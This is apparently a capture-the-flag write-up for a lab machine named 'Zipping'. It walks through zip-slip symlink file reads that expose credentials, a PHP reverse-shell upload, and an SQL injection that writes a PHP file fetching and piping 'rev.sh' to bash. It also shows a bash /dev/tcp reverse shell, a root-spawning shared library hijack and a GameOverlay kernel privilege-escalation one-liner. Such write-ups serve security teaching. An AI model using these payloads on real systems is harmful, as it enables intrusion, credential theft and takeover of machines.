# Zipping

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.113.161
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 18:54 UTC
Nmap scan report for 10.129.113.161
Host is up (0.098s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/26%OT=22%CT=1%CU=34947%PV=Y%DS=2%DC=T%G=Y%TM=64EA4A7
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=107%TI=Z%
OS:CI=Z%II=I%TS=9)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53A
OS:ST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W
OS:5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y
OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   66.58 ms  10.10.16.1
2   110.87 ms 10.129.113.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.13 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.113.161
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 18:54 UTC
Nmap scan report for 10.129.113.161
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/26%OT=22%CT=1%CU=33079%PV=Y%DS=2%DC=T%G=Y%TM=64EA4AA
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=FD
OS:%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=
OS:M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   49.84 ms 10.10.16.1
2   49.90 ms 10.129.113.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.35 seconds
```

```c
$ sudo nmap -sV -sU 10.129.113.161
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 18:56 UTC
Nmap scan report for 10.129.113.161
Host is up (0.043s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1100.19 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.113.161/

```c
$ whatweb http://10.129.113.161/
http://10.129.113.161/ [200 OK] Apache[2.4.54], Bootstrap, Country[RESERVED][ZZ], Email[info@website.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.54 (Ubuntu)], IP[10.129.113.161], JQuery[3.4.1], Meta-Author[Devcrud], PoweredBy[precision], Script, Title[Zipping | Watch store]
```

### Directory Busting with dirsearch

```c
$ dirsearch -u http://10.129.113.161/
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/user/.dirsearch/reports/10.129.113.161/-_23-08-26_18-54-50.txt

Error Log: /home/user/.dirsearch/logs/errors-23-08-26_18-54-50.log

Target: http://10.129.113.161/

[18:54:50] Starting: 
[18:54:54] 403 -  279B  - /.ht_wsr.txt                                     
[18:54:54] 403 -  279B  - /.htaccess.bak1                                  
[18:54:54] 403 -  279B  - /.htaccess.sample
[18:54:54] 403 -  279B  - /.htaccess.orig
[18:54:54] 403 -  279B  - /.htaccess.save
[18:54:54] 403 -  279B  - /.htaccess_extra
[18:54:54] 403 -  279B  - /.htaccess_sc
[18:54:54] 403 -  279B  - /.htaccess_orig
[18:54:54] 403 -  279B  - /.htaccessBAK
[18:54:54] 403 -  279B  - /.htaccessOLD                                    
[18:54:54] 403 -  279B  - /.htaccessOLD2
[18:54:54] 403 -  279B  - /.html
[18:54:54] 403 -  279B  - /.htm
[18:54:54] 403 -  279B  - /.htpasswds
[18:54:54] 403 -  279B  - /.htpasswd_test
[18:54:54] 403 -  279B  - /.httr-oauth                                     
[18:54:55] 403 -  279B  - /.php                                            
[18:55:09] 301 -  317B  - /assets  ->  http://10.129.113.161/assets/        
[18:55:09] 200 -    2KB - /assets/                                          
[18:55:20] 200 -   16KB - /index.php/login/                                 
[18:55:20] 200 -   16KB - /index.php
[18:55:32] 403 -  279B  - /server-status                                    
[18:55:32] 403 -  279B  - /server-status/                                   
[18:55:33] 301 -  315B  - /shop  ->  http://10.129.113.161/shop/            
[18:55:38] 200 -    5KB - /upload.php                                       
[18:55:38] 403 -  279B  - /uploads/                                         
[18:55:38] 301 -  318B  - /uploads  ->  http://10.129.113.161/uploads/      
                                                                             
Task Completed
```

> http://10.129.113.161/upload.php

> http://10.129.113.161/uploads/

## Local File Inclusion (LFI)

> http://10.129.113.161/shop/index.php?page=product&id=1

> http://10.129.113.161/shop/index.php?page=../upload

Modified Request:

```c
GET /shop/index.php?page=../upload HTTP/1.1
Host: 10.129.113.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.113.161/shop/
DNT: 1
Connection: close
Cookie: PHPSESSID=vd898t9g2lsr2ahrljvrlh6uk2
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

## Zip Slip Vulnerability

```c
$ ln -s ../../../../../../../../../../etc/passwd name_of_symlink.pdf
```

```c
$ zip --symlink zip_file.zip name_of_symlink.pdf
  adding: name_of_symlink.pdf (stored 0%)
```

```c
$ curl http://10.129.113.161/uploads/9e834cd1f279deeb18fb85bb1abf8a51/name_of_symlink.pdf
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

| Username |
| --- |
| rektsu |

## user.txt

```c
$ ln -s ../../../../../../../../../../home/rektsu/user.txt name_of_symlink.pdf
```

```c
$ zip --symlink zip_file.zip name_of_symlink.pdf                                         
  adding: name_of_symlink.pdf (stored 0%)
```

```c
$ curl http://10.129.113.161/uploads/9e0c7ea7455ac2fa663d6efee7afffc0/name_of_symlink.pdf
43a343f20b51f55c37df8f94365a193d
```

## Further Enumeration

```c
$ ln -s ../../../../../../../../../../var/www/html/shop/functions.php name_of_symlink.pdf
```

```c
$ zip --symlink zip_file.zip name_of_symlink.pdf                                         
  adding: name_of_symlink.pdf (stored 0%)
```

```c
$ curl http://10.129.113.161/uploads/bb79b66a164f1911c5be6487dc4f02f4/name_of_symlink.pdf
<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
    try {
        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
        // If there is an error with the connection, stop the script and display the error.
        exit('Failed to connect to database!');
    }
}
```

| Username | Password | Database |
| --- | --- | --- |
| root | MySQL_P@ssw0rd! | zipping |

## Foothold (Unintended - FIXED!!)

> https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php

```c
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.16.15', 9001);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

```c
$ zip shell.zip shell.phpA.pdf 
  adding: shell.phpA.pdf (deflated 72%)
```

```c
$ imhex shell.zip
````

We replaced the `second` occurance of `A` with `null bytes (00)`, uploaded it, removed the `space` in the `url` and `curled` it.

```c
4B 01 02 1E 03 14 00 00 00 08 00 51 A6 1A 57 26 A7 E2 9C 17 0A 00 00 57 24 00 00 0E 00 18 00 00 00 00 00 01 00 00 00 A4 81 00 00 00 00 73 68 65 6C 6C 2E 70 68 70 00 2E 70 64 66 55 54 05 00 03 99 65 EA 64 75 78 0B 00 01 04 E8 03 00 00 04 E8 03 00 00 50 4B 05 06 00 00 00 00 01 00 01 00 54
```

```c
$ curl http://10.129.113.161/uploads/b0c98655fab74de04d5bbc3b58311fd8/shell.php
```

```c
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.113.161] 59220
SOCKET: Shell has connected! PID: 2608
```

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
rektsu@zipping:/var/www/html/uploads/b0c98655fab74de04d5bbc3b58311fd8$
```

## Foothold

### SQL Injection (SQLi) in ID Parameter

URL encoded Payload:

```c
/shop/index.php?page=product&id=%0A%27%3bselect%2b%27%3c%3fphp%2bsystem%28%22curl%2bhttp%3a//10.10.16.16/rev.sh|bash%22%29%3b%3f%3e%27%2binto%2boutfile%2b%27/var/lib/mysql/foobar.php%27%2b%231
```

Modified Request:

```c
GET /shop/index.php?page=product&id=%0A%27%3bselect%2b%27%3c%3fphp%2bsystem%28%22curl%2bhttp%3a//10.10.16.16/rev.sh|bash%22%29%3b%3f%3e%27%2binto%2boutfile%2b%27/var/lib/mysql/foobar.php%27%2b%231 HTTP/1.1
Host: 10.129.211.206
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.229/shop/
DNT: 1
Connection: close
Cookie: PHPSESSID=uqdm9aa90iadm2tm3ebum1ihkk
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 200 OK
Date: Thu, 14 Sep 2023 17:54:12 GMT
Server: Apache/2.4.54 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 23
Connection: close
Content-Type: text/html; charset=UTF-8

Product does not exist!
```

Payload:

```c
$ cat rev.sh 
bash -c 'bash -i >& /dev/tcp/10.10.16.16/9001 0>&1'
```

Trigger:

```c
$ curl -s $'http://zipping.htb/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2fshell'
```

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                                                                           
10.129.211.206 - - [14/Sep/2023 15:10:26] "GET /rev.sh HTTP/1.1" 200 -
```

```c
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.16] from (UNKNOWN) [10.129.211.206] 52194
bash: cannot set terminal process group (1092): Inappropriate ioctl for device
bash: no job control in this shell
rektsu@zipping:/var/www/html/shop$
```

## Stabilizing Shell

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```c
$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

rektsu@zipping:/home/rektsu$ 
rektsu@zipping:/home/rektsu$ export XTERM=xterm
rektsu@zipping:/home/rektsu$
```

## Enumeration

```c
rektsu@zipping:/home/rektsu$ id
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
```

```c
rektsu@zipping:/home/rektsu$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

## Analyzing the Binary

```c
rektsu@zipping:/home/rektsu$ strings /usr/bin/stock
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
exit
fopen
__libc_start_main
fprintf
dlopen
__isoc99_fscanf
__cxa_finalize
strchr
fclose
__isoc99_scanf
strcmp
__errno_location
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Hakaize
St0ckM4nager
/root/.stock.csv
Enter the password: 
Invalid password, please try again.
================== Menu ==================
1) See the stock
2) Edit the stock
3) Exit the program
Select an option: 
You do not have permissions to read the file
File could not be opened.
================== Stock Actual ==================
Colour     Black   Gold    Silver
Amount     %-7d %-7d %-7d
Quality   Excelent Average Poor
Amount    %-9d %-7d %-4d
Exclusive Yes    No
Amount    %-4d   %-4d
Warranty  Yes    No
================== Edit Stock ==================
Enter the information of the watch you wish to update:
Colour (0: black, 1: gold, 2: silver): 
Quality (0: excelent, 1: average, 2: poor): 
Exclusivity (0: yes, 1: no): 
Warranty (0: yes, 1: no): 
Amount: 
Error: The information entered is incorrect
%d,%d,%d,%d,%d,%d,%d,%d,%d,%d
The stock has been updated correctly.
;*3$"
GCC: (Debian 12.2.0-3) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
stock.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
__errno_location@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__isoc99_fscanf@GLIBC_2.7
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
_fini
strchr@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
dlopen@GLIBC_2.34
fprintf@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
checkAuth
_end
__bss_start
main
fopen@GLIBC_2.2.5
__isoc99_scanf@GLIBC_2.7
exit@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

| Password |
| --- |
| St0ckM4nager |

```c
rektsu@zipping:/home/rektsu$ strace /usr/bin/stock        
execve("/usr/bin/stock", ["/usr/bin/stock"], 0x7fff5310b5c0 /* 17 vars */) = 0
brk(NULL)                               = 0x558f06ca4000
arch_prctl(0x3001 /* ARCH_??? */, 0x7fff2bd6f790) = -1 EINVAL (Invalid argument)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ff0fac7f000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=18225, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 18225, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ff0fac7a000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\3206\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2072888, ...}, AT_EMPTY_PATH) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2117488, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ff0faa00000
mmap(0x7ff0faa22000, 1544192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7ff0faa22000
mmap(0x7ff0fab9b000, 356352, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19b000) = 0x7ff0fab9b000
mmap(0x7ff0fabf2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f1000) = 0x7ff0fabf2000
mmap(0x7ff0fabf8000, 53104, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ff0fabf8000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ff0fac77000
arch_prctl(ARCH_SET_FS, 0x7ff0fac77740) = 0
set_tid_address(0x7ff0fac77a10)         = 2025
set_robust_list(0x7ff0fac77a20, 24)     = 0
rseq(0x7ff0fac78060, 0x20, 0, 0x53053053) = 0
mprotect(0x7ff0fabf2000, 16384, PROT_READ) = 0
mprotect(0x558f05de8000, 4096, PROT_READ) = 0
mprotect(0x7ff0facb5000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7ff0fac7a000, 18225)           = 0
newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}, AT_EMPTY_PATH) = 0
getrandom("\x65\x5b\x3a\x1e\xc9\xd2\x89\xef", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x558f06ca4000
brk(0x558f06cc5000)                     = 0x558f06cc5000
newfstatat(0, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}, AT_EMPTY_PATH) = 0
write(1, "Enter the password: ", 20Enter the password: )    = 20
read(0, St0ckM4nager
"St0ckM4nager\n", 1024)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
write(1, "\n================== Menu ======="..., 44
================== Menu ==================
) = 44
write(1, "\n", 1
)                       = 1
write(1, "1) See the stock\n", 171) See the stock
)      = 17
write(1, "2) Edit the stock\n", 182) Edit the stock
)     = 18
write(1, "3) Exit the program\n", 203) Exit the program
)   = 20
write(1, "\n", 1
)                       = 1
write(1, "Select an option: ", 18Select an option: )      = 18
read(0,
```

We used `strace` again while logging in.

```c
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

> https://tbhaxor.com/exploiting-shared-library-misconfigurations/

```c
$ cat libcounter.c 
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

```c
rektsu@zipping:/home/rektsu/.config$ wget http://10.10.16.15/libcounter.c
--2023-08-26 22:38:30--  http://10.10.16.15/libcounter.c
Connecting to 10.10.16.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 116 [text/x-csrc]
Saving to: ‘libcounter.c’

libcounter.c        100%[===================>]     116  --.-KB/s    in 0s      

2023-08-26 22:38:31 (15.6 MB/s) - ‘libcounter.c’ saved [116/116]
```

```c
rektsu@zipping:/home/rektsu/.config$ gcc -shared -fPIC -nostartfiles -o libcounter.so libcounter.c
rektsu@zipping:/home/rektsu/.config$ ls
libcounter.c  libcounter.so
rektsu@zipping:/home/rektsu/.config$ sudo /usr/bin/stock
Enter the password: St0ckM4nager
root@zipping:/home/rektsu/.config# id
uid=0(root) gid=0(root) groups=0(root)
```

## Unintended Way via CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE

> https://twitter.com/liadeliyahu/status/1684841527959273472?s=09

```c
rektsu@zipping:/tmp/new$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("chmod u+s /bin/bash")'
```

```c
rektsu@zipping:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1433736 Oct  7  2022 /bin/bash
```

```c
rektsu@zipping:/tmp/new$ /bin/bash -p
bash-5.2# id
uid=1001(rektsu) gid=1001(rektsu) euid=0(root) groups=1001(rektsu)
bash-5.2#
```

## root.txt

```c
bash-5.2# cat root.txt
2261225ccabd45023bda906a72889bf0
```
